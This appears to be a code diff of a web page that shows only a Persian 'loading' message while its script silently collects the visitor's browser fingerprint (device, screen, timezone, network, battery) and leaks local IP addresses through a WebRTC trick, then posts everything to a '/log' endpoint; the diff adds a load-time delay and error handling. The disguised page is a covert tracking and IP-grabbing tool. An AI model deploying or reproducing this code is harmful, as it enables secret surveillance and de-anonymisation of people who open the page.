@@ -16,61 +16,71 @@
   <div class="text">در حال بارگذاری...</div>
 
 <script>
-setTimeout(async () => {
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+// صبر 2 ثانیه + اجرای بعد از لود کامل
+window.addEventListener('load', () => {
+  setTimeout(async () => {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
-  const data = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language,
-    languages: navigator.languages,
-    cookieEnabled: navigator.cookieEnabled,
-    online: navigator.onLine,
-    doNotTrack: navigator.doNotTrack,
-    hardware: navigator.hardwareConcurrency + ' هسته',
-    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'نامشخص',
-    network: conn ? {
-      type: conn.effectiveType,
-      downlink: conn.downlink + 'Mbps',
-      rtt: conn.rtt + 'ms',
-      saveData: conn.saveData
-    } : 'نامشخص',
-    battery: 'getBattery' in navigator ? await navigator.getBattery().then(b => ({
-      level: (b.level * 100).toFixed(0) + '%',
-      charging: b.charging
-    })) : 'نامشخص',
-    webrtc_ips: await getWebRTCIPs()
-  };
+    const data = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language,
+      languages: navigator.languages,
+      cookieEnabled: navigator.cookieEnabled,
+      online: navigator.onLine,
+      doNotTrack: navigator.doNotTrack,
+      hardware: navigator.hardwareConcurrency + ' هسته',
+      memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'نامشخص',
+      network: conn ? {
+        type: conn.effectiveType,
+        downlink: conn.downlink + 'Mbps',
+        rtt: conn.rtt + 'ms',
+        saveData: conn.saveData
+      } : 'نامشخص',
+      battery: 'getBattery' in navigator ? await navigator.getBattery().then(b => ({
+        level: (b.level * 100).toFixed(0) + '%',
+        charging: b.charging
+      })) : 'نامشخص',
+      webrtc_ips: await getWebRTCIPs()
+    };
 
-  try {
-    await fetch('/log', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data),
-      keepalive: true
-    });
-  } catch (e) {
-    console.error('خطا در ارسال:', e);
-  }
-}, 1500);
+    // ارسال با خطایابی
+    try {
+      const res = await fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+        keepalive: true
+      });
+      console.log('ارسال شد (موبایل):', res.status);
+    } catch (e) {
+      console.error('خطا در ارسال (موبایل):', e);
+    }
+  }, 2000); // 2 ثانیه صبر
+});
 
 function getWebRTCIPs() {
   return new Promise(resolve => {
     const ips = new Set();
-    const pc = new RTCPeerConnection({iceServers: []});
-    pc.createDataChannel('');
-    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-    pc.onicecandidate = e => {
-      if (!e.candidate) return;
-      const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-      if (ip) ips.add(ip[1]);
-    };
+    let pc;
+    try {
+      pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+      pc.onicecandidate = e => {
+        if (!e.candidate) return;
+        const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (match) ips.add(match[1]);
+      };
+    } catch (err) {
+      console.error('WebRTC خطا:', err);
+    }
     setTimeout(() => {
-      pc.close();
+      if (pc) pc.close();
       resolve([...ips]);
-    }, 2000);
+    }, 2500);
   });
 }
 </script>
